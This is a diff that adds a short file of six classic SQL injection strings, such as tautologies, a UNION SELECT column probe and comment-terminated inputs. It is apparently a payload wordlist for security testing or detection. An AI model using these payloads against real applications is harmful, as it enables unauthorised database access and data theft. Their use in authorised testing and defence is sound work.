@@ -1,0 +1,6 @@
+' OR '1'='1
+' UNION SELECT NULL,NULL,NULL--
+' OR 1=1--
+' AND 1=1--
+' OR 'a'='a
+' OR 1=1#
